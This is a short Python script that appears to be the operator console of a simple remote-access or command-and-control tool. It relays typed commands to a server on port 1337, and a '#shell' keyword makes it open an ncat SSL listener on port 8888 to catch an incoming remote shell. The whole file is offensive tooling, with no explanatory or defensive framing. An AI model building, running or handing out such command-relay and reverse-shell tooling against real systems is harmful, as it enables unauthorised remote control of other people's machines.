#!/usr/bin/python3

import socket
import os
import time

ip = '0.0.0.0'
port = 1337
s = socket.create_connection((ip,port))

while True:
    message = input('To server: ')
    if '#shell' in message:
        os.system("gnome-terminal -e 'bash -c \"ncat -nlvp 8888 --ssl\" '")
        time.sleep(3)
    s.send(message.encode())
    data = s.recv(1024)
    print(data.decode('utf-8'))
